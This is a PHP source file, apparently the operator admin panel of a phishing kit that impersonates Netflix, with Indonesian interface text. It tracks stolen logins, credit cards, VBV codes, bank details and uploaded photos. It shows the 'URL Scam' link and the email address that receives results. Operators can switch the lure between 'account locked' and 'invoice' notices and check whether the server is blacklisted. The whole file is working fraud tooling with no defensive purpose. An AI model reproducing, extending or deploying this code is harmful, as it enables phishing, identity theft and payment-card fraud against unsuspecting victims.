<?php
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");
include 'config.php';
include 'admin.function.php';
$email = $_POST['email'];
$_SESSION['email'] = "$email";
$password = $_POST['password'];
$config = parse_ini_file('../key.ini');
$settingan = parse_ini_file('../.config');
$key = $config['private_key'];
$public_key = $config['public_key'];
$page = $_GET['p'];
$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
if (!file_exists("../.config")){
    $contents = load_conf();
    $tulis = fopen("../.config","a");
    fwrite($tulis,$contents);
    fclose($tulis);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>NETFLIX - Admin Panel</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->  
    <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->  
    <link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->  
    <link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="css/util.css">
    <link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
<?php if($page == "") {
if(isset($_SESSION['email'])) {
        echo "<script type='text/javascript'>window.top.location='?p=home';</script>";
        exit();
}
if(isset($_POST['email'])) {
    //$login = login($_POST['email'], $_POST['password']);
    $login = 'invalid';
    if($_POST['email'] == $logindata['email'] && $_POST['password'] == $logindata['passw']){
        $login = 'valid';
    }
    if($login == "valid"){
        $_SESSION['email'] = $_POST['email'];
        $_SESSION['password'] = $_POST['password'];
    }else if($login == "lock") {
        echo "<script type='text/javascript'>window.top.location='?p=lock';</script>";
        exit();
    }else{
        echo "<script type='text/javascript'>window.top.location='?p=gagal';</script>";
        exit();
    }
    $valid = valid_key($domain,$key);
    if($valid == "valid") {
        echo "<script type='text/javascript'>window.top.location='?p=home';</script>";
    }
    else{
        echo "<script type='text/javascript'>window.top.location='?p=home';</script>";
    }
}
if($public_key == "your_public_key") {
    echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>
                    
                </div>

                <form action="index.php?p=adduser" method="POST" class="login100-form validate-form">
                    <div class="wrap-input100 validate-input m-b-26" data-validate="Public key is required">
                        <span class="label-input100">Public Key</span>
                        <input class="input100" type="text" name="public_key" placeholder="Enter public key">
                        <span class="focus-input100"></span>
                    </div>
                    
                    <div class="flex-sb-m w-full p-b-30">
                        <div class="contact100-form-checkbox">
                             <div class="container-login100-form-btn">
                        <button class="login100-form-btn">
                            Continue
                        </button>
                        
                    </div>
                        </div>

                        <div style="margin-bottom:30px;">
                            <a href="https://fb.me/riswanda.ns" class="txt1">
                                Powered by Z1coder Team
                            </a>
                        </div>
                    </div>
                    
                    

                   
                </form>
            </div>
        </div>
    </div>';
}else{
echo '  <div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>
                    
                </div>

                <form action="index.php" method="POST" class="login100-form validate-form">
                
                    <div class="wrap-input100 validate-input m-b-26" data-validate="Email is required">
                        <span class="label-input100">Email</span>
                        <input class="input100" type="email" name="email" placeholder="Enter email">
                        <span class="focus-input100"></span>
                    </div>

                    <div class="wrap-input100 validate-input m-b-18" data-validate = "Password is required">
                        <span class="label-input100">Password</span>
                        <input class="input100" type="password" name="password" placeholder="Enter password">
                        <span class="focus-input100"></span>
                    </div>

                    <div class="flex-sb-m w-full p-b-30">
                        <div class="contact100-form-checkbox">
                            <input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
                            <label class="label-checkbox100" for="ckb1">
                                Remember me
                            </label>
                        </div>

                    </div>

                    <div class="container-login100-form-btn">
                        <button class="login100-form-btn">
                            Login
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>';
}
}

if($page == "gagal") {
    echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>
                    
                </div>
                
                <form action="index.php" method="POST" class="login100-form validate-form">
                    <font color="red">Email atau Password salah</font>
                    <div class="wrap-input100 validate-input m-b-26" data-validate="Email is required">
                        <span class="label-input100">Email</span>
                        <input class="input100" type="email" name="email" placeholder="Enter email">
                        <span class="focus-input100"></span>
                    </div>

                    <div class="wrap-input100 validate-input m-b-18" data-validate = "Password is required">
                        <span class="label-input100">Password</span>
                        <input class="input100" type="password" name="password" placeholder="Enter password">
                        <span class="focus-input100"></span>
                    </div>
                    

                    <div class="flex-sb-m w-full p-b-30">
                        <div class="contact100-form-checkbox">
                            <input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
                            <label class="label-checkbox100" for="ckb1">
                                Remember me
                            </label>
                        </div>

                        <div>
                            
                        </div>
                    </div>

                    <div class="container-login100-form-btn">
                        <button class="login100-form-btn">
                            Login
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>';
}

if($page == "lock") {
    echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>
                    
                </div>
                
                <form action="index.php" method="POST" class="login100-form validate-form">
                    <font color="red">Akun dikunci karena masalah keamanan</font>
                    <div class="wrap-input100 validate-input m-b-26" data-validate="Email is required">
                        <span class="label-input100">Email</span>
                        <input class="input100" type="email" name="email" placeholder="Enter email">
                        <span class="focus-input100"></span>
                    </div>

                    <div class="wrap-input100 validate-input m-b-18" data-validate = "Password is required">
                        <span class="label-input100">Password</span>
                        <input class="input100" type="password" name="password" placeholder="Enter password">
                        <span class="focus-input100"></span>
                    </div>
                    

                    <div class="flex-sb-m w-full p-b-30">
                        <div class="contact100-form-checkbox">
                            <input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
                            <label class="label-checkbox100" for="ckb1">
                                Remember me
                            </label>
                        </div>

                        <div>
                            
                        </div>
                    </div>

                    <div class="container-login100-form-btn">
                        <button class="login100-form-btn">
                            Login
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>';
}

if($page == "adduser") {
    $click = "../key.ini";
    $fps = fopen($click, "r");
    $contents = fread($fps, filesize($click));
    fclose($fps);

    $contents = str_replace("your_public_key",bin2hex($_POST['public_key']),$contents);
    unlink("../key.ini");
    $tulis = fopen("../key.ini","a");
    fwrite($tulis,$contents);
    fclose($tulis);
    echo "<script type='text/javascript'>window.top.location='?p=';</script>";
}

if($page == "home") {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
    //$valid = valid_key($domain,$key);
    $valid = 'valid';
    if($valid == "valid"){
        $font = "Active";
    }else{
        $font = "Inactive";
    }
    echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                <div style="margin-top:-2px;background:#000;text-align:center;">
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=home">Status</a> <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=setting">Setting</a> 
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=notice">Notice</a> <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=statistic">Statistic</a> 
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=logout">Logout</a> 
            </div>
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>
                    
                </div>
                <form action="index.php" method="POST" class="login100-form validate-form">
                
                    <div class="wrap-input100 validate-input m-b-26">
                        <span class="label-input100">Domain</span>
                        <input class="input100" value="'.$domain.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    
                    <div class="wrap-input100 validate-input m-b-18">
                        <span class="label-input100">Email Result</span>
                        <input class="input100" value="'.$settingan['email'].'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    
                    <div class="wrap-input100 validate-input m-b-18">
                        <span class="label-input100">URL Scam</span>
                        <input class="input100" value="https://'.$_SERVER['HTTP_HOST'].'/?'.$settingan['parameter'].'" disabled>
                        <span class="focus-input100"></span>
                    </div>

                    <div class="wrap-input100 validate-input m-b-18">
                        <span class="label-input100">Status</span>
                        <input class="input100" value="'.$font.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    
                    <div class="container-login100-form-btn">
                        <a style="text-decoration:none;color:#fff;" target="_blank" href="index.php?p=check_blacklist">
                        <span style="background:#000;" class="login100-form-btn">
                            Check IP WHM Blacklist
                        </span</a>
                        
                        
                        
                    </div>

                    
                </form>
                
            </div>
        </div>
    </div>';
}
if($page == "notice_invoice") {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
    unlink("../lang.ini");
    $contents = load_invoice();
    $tulis = fopen("../lang.ini","a");
    fwrite($tulis,$contents);
    fclose($tulis);
    echo "<script type='text/javascript'>alert('Berhasil mengganti notice ke invoice');window.top.location='?p=notice';</script>";
}

if($page == "notice_locked") {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
    unlink("../lang.ini");
    $contents = load_locked();
    $tulis = fopen("../lang.ini","a");
    fwrite($tulis,$contents);
    fclose($tulis);
    echo "<script type='text/javascript'>alert('Berhasil mengganti notice ke locked');window.top.location='?p=notice';</script>";
}

if($page == "check_blacklist") {
    $ipserver = $_SERVER['SERVER_ADDR'];
?>
<script type="text/javascript">
    window.onload=function(){
        document.forms["form"].submit();
    }
    </script>
<form name='form' id='form' action='http://www.ipvoid.com/ip-blacklist-check/' method='POST'>
        <div style='display:none;'>
        <input name='ip' value='<?php echo $ipserver;?>' />
        <input type='submit' class='button primary' value='Continue' />
        </div>
    </form>
<?php
}

if($page == "generate"){
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
	
	if(isset($_POST['domain'])) {
    	if(!isset($_SESSION['email'])) {
        	die("<script type='text/javascript'>window.top.location='index.php';</script>");
	    }
    	$click = "../key.ini";
    	$fps = fopen($click, "r");
    	$contents = fread($fps, filesize($click));
    	fclose($fps);
    	$contents = str_replace($key,bin2hex(md5($_POST['domain'])),$contents);
    	unlink("../key.ini");
    	unlink("../manage/key.ini");
    	unlink("../.serial");
    	unlink("../result/total_login.txt");
    	unlink("../result/total_cc.txt");
    	unlink("../result/total_vbv.txt");
    	unlink("../result/total_upload.txt");
    	unlink("../result/total_click.txt");
    	unlink("../result/total_bank.txt");
    	unlink("../result/total_bot.txt");
    	unlink("../result/total_bin.txt");
    	unlink("../result/log_visitor.txt");
    	$tulis = fopen("../key.ini","a");
    	fwrite($tulis,$contents);
    	fclose($tulis);
    
	    $tulis = fopen("../.serial","a");
	    fwrite($tulis,"id = ".sha1($domain.$public_key));
    	fclose($tulis);
    
	    $tulis = fopen("../manage/key.ini","a");
    	fwrite($tulis,$contents);
    	fclose($tulis);
    
	    $tulis = fopen("../manage/.serial","a");
    	fwrite($tulis,"id = ".sha1($domain.$public_key));
    	fclose($tulis);

	    $user = $_SESSION['email'];
    	$pass = $_SESSION['password'];
    	$domain = $_POST['domain'];
    	$license = bin2hex(md5($domain));
    	register_key($user,$pass,$license,$domain);
    	echo "<script type='text/javascript'>alert('Berhasil mendaftarkan domain');window.top.location='?p=home';</script>";

    }
	echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>
                    
                </div>

                <form action="index.php?p=generate" method="POST" class="login100-form">
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Domain</span>
                        <input class="input100" type="text" name="domainnya" value="'.$domain.'" disabled>
                        <input class="input100" type="hidden" name="domain" value="'.$domain.'">
                        <span class="focus-input100"></span>
                    </div>

                    <div class="container-login100-form-btn">
                        <button class="login100-form-btn">
                            Active Now
                        </button>
                        
                    </div>
                </form>
            </div>
        </div>
    </div>';
}

if($page == "setting") {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
if(isset($_POST['config'])) {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
    
    $contents = str_replace($key,bin2hex(md5($_POST['domain'])),$contents);
    unlink("../.config");
    $tulis = fopen("../.config","a");
    fwrite($tulis,$_POST['config']);
    fclose($tulis);
    echo "<script type='text/javascript'>alert('Berhasil Menyimpan Settingan');window.top.location='?p=setting';</script>";
    
}
$setting = parse_ini_file('../.config');
$click = "../.config";
$file = fopen($click, "r");
$contents = fread($file, filesize($click));
fclose($file);
echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                <div style="margin-top:-2px;background:#000;text-align:center;">
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=home">Status</a> <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=setting">Setting</a> 
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=notice">Notice</a> <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=statistic">Statistic</a> 
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=logout">Logout</a> 
            </div>
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>
                    
                </div>

                <form action="" method="POST" class="">
                    <br><span style="margin-left:20px;"><b>Setting Config</b></span><br>
                    <textarea name="config" style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="20" cols="70%">
                   '.$contents.'
                    </textarea>
                    <br><br>
                    <div class="container-login100-form-btn">
                        <button style="margin-left:20px;" class="login100-form-btn">
                            Save
                        </button>
                        &nbsp;&nbsp;<a style="text-decoration:none;color:#fff;" href="index.php?p=defaultconfig">
                        <span style="background:#000;" class="login100-form-btn">
                            Reset Default
                        </span></a>
                    </div><br>
                </form>
            </div>
        </div>
    </div>';
}

if($page == "notice") {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
if(isset($_POST['noticeconfig'])) {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }

    $contents = str_replace($key,bin2hex(md5($_POST['domain'])),$contents);
    unlink("../lang.ini");
    $tulis = fopen("../lang.ini","a");
    fwrite($tulis,$_POST['noticeconfig']);
    fclose($tulis);
    echo "<script type='text/javascript'>alert('Berhasil Menyimpan Settingan');window.top.location='?p=notice';</script>";
}

$setting = parse_ini_file('../lang.ini');
$click = "../lang.ini";
$file = fopen($click, "r");
$contents = fread($file, filesize($click));
fclose($file);
echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                <div style="margin-top:-2px;background:#000;text-align:center;">
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=home">Status</a> <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=setting">Setting</a> 
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=notice">Notice</a> <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=statistic">Statistic</a> 
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=logout">Logout</a> 
            </div>
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>
                    
                </div>

                <form action="" method="POST" class="">
                    <br><span style="margin-left:20px;"><b>Custom Notice</b>&nbsp;&nbsp;<a style="color:#fff;padding:5px;background-color:grey;border-radius:6px;" href="index.php?p=notice_locked">Locked</a> &nbsp;<a style="color:#fff;padding:5px;background-color:grey;border-radius:6px;" href="index.php?p=notice_invoice">Invoice</a></span><br>
                    <textarea name="noticeconfig" style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="20" cols="70%">
                   '.$contents.'
                    </textarea>
                    <br><br>
                    <div class="container-login100-form-btn">
                        <button style="margin-left:20px;" class="login100-form-btn">
                            Save
                        </button>
                    </div><br>
                </form>
            </div>
        </div>
    </div>';
}

if($page == "history") {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
    $click = "../result/log_visitor.txt";
$file = fopen($click, "r");
$log_visitor = fread($file, filesize($click));
$log_visitor = "\n".$log_visitor;
fclose($file);
$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$log_bot = fread($file, filesize($click));
$log_bot = "\n".$log_bot;
fclose($file);

$click = "../result/total_bin.txt";
$file = fopen($click, "r");
$log_bin = fread($file, filesize($click));
$log_bin = "\n".$log_bin;
fclose($file);
echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                <div style="margin-top:-2px;background:#000;text-align:center;">
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=home">Status</a> <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=setting">Setting</a> 
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=notice">Notice</a> <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=statistic">Statistic</a> 
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=logout">Logout</a> 
            </div>
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>
                    
                </div>

                    <br><span style="margin-left:20px;"><b>Log Visitor</b></span><br>
                    <textarea style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="15" cols="70%" disabled>
                   '.$log_visitor.'
                    </textarea>
                    <br><br><span style="margin-left:20px;"><b>BIN List</b></span><br>
                    <textarea style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="15" cols="70%" disabled>
                   '.$log_bin.'
                    </textarea>
                    <br><br><span style="margin-left:20px;"><b>Bot Detected</b></span><br>
                    <textarea style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="15" cols="70%" disabled>
                   '.$log_bot.'
                    </textarea>
                    <br><br>
                    <br>
            </div>
        </div>
    </div>';
}

if($page == "statistic") {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
$click = "../result/total_click.txt";
$file = fopen($click, "r");
$total_click = fread($file, filesize($click));
$total_click = substr_count($total_click, "\n");
fclose($file);
if($total_click == 0) {
    $total_click = "$total_click";
}else{
    $total_click = "$total_click";
}

$click = "../result/total_login.txt";
$file = fopen($click, "r");
$total_login = fread($file, filesize($click));
$total_login = substr_count($total_login, "\n");
fclose($file);
if($total_login == 0) {
    $total_login = "$total_login";
}else{
    $total_login = "$total_login";
}

$click = "../result/total_cc.txt";
$file = fopen($click, "r");
$total_cc = fread($file, filesize($click));
$total_cc = substr_count($total_cc, "\n");
fclose($file);
if($total_cc == 0) {
    $total_cc = "$total_cc";
}else{
    $total_cc = "$total_cc";
}

$click = "../result/total_vbv.txt";
$file = fopen($click, "r");
$total_vbv = fread($file, filesize($click));
$total_vbv = substr_count($total_vbv, "\n");
fclose($file);
if($total_vbv == 0) {
    $total_vbv = "$total_vbv";
}else{
    $total_vbv = "$total_vbv";
}

$click = "../result/total_bank.txt";
$file = fopen($click, "r");
$total_bank = fread($file, filesize($click));
$total_bank = substr_count($total_bank, "\n");
fclose($file);
if($total_bank == 0) {
    $total_bank = "$total_bank";
}else{
    $total_bank = "$total_bank";
}

$click = "../result/total_upload.txt";
$file = fopen($click, "r");
$total_photo = fread($file, filesize($click));
$total_photo = substr_count($total_photo, "\n");
fclose($file);
if($total_photo == 0) {
    $total_photo = "$total_photo";
}else{
    $total_photo = "$total_photo";
}

$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$total_botnya = fread($file, filesize($click));
$total_botnya = substr_count($total_botnya, "\n");
fclose($file);
if($total_botnya == 0) {
    $total_botnya = "$total_botnya";
}else{
    $total_botnya = "$total_botnya";
}

$click = "../result/log_visitor.txt";
$file = fopen($click, "r");
$log_visitor = fread($file, filesize($click));
fclose($file);

$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$log_bot = fread($file, filesize($click));
fclose($file);

$click = "../result/total_bin.txt";
$file = fopen($click, "r");
$log_bin = fread($file, filesize($click));
fclose($file);
echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
            <div style="margin-top:-2px;background:#000;text-align:center;">
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=home">Status</a> <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=setting">Setting</a> 
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=notice">Notice</a> <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=statistic">Statistic</a> 
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=logout">Logout</a> 
            </div>
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>
                    
                </div>

                <div class="login100-form">
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Click</span>
                        <input class="input100" type="text" value="'.$total_click.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Login</span>
                        <input class="input100" type="text" value="'.$total_login.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Credit Card</span>
                        <input class="input100" type="text" value="'.$total_cc.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">VBV</span>
                        <input class="input100" type="text" value="'.$total_vbv.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                   
                    <div class="wrap-input100 validate-input m-b-18">
                        <span class="label-input100">Bot Detected</span>
                        <input class="input100" type="text" value="'.$total_botnya.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    

                    <div class="container-login100-form-btn">
                        <a style="text-decoration:none;color:#fff;" href="index.php?p=resetdata">
                        <span style="background:#000;" class="login100-form-btn">
                            Reset Data
                        </span></a>
                        &nbsp;&nbsp;<a style="text-decoration:none;color:#fff;" href="index.php?p=history">
                        <span style="background:#000;" class="login100-form-btn">
                            Log History
                        </span></a>
                        
                        
                    </div>
                </div>
            </div>
        </div>
    </div>';
}

if($page == "logout") {
    session_destroy();
    echo "<script type='text/javascript'>window.top.location='?';</script>";
}

if($page == "resetdata") {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
    unlink("../result/total_login.txt");
    unlink("../result/total_cc.txt");
    unlink("../result/total_vbv.txt");
    unlink("../result/total_bot.txt");
    unlink("../result/total_bin.txt");
    unlink("../result/total_upload.txt");
    unlink("../result/total_click.txt");
    unlink("../result/total_bank.txt");
    unlink("../result/log_visitor.txt");
    echo "<script type='text/javascript'>window.top.location='?p=statistic';</script>";
}

if($page == "defaultconfig") {
    if(!isset($_SESSION['email'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
    $contents = load_conf();
    unlink("../.config");
    $tulis = fopen("../.config","a");
    fwrite($tulis,$contents);
    fclose($tulis);
    echo "<script type='text/javascript'>alert('Berhasil mereset config');window.top.location='?p=setting';</script>";
}


?>
<!--===============================================================================================-->
    <script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/bootstrap/js/popper.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/daterangepicker/moment.min.js"></script>
    <script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
    <script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
    <script src="js/main.js"></script>

</body>
</html>
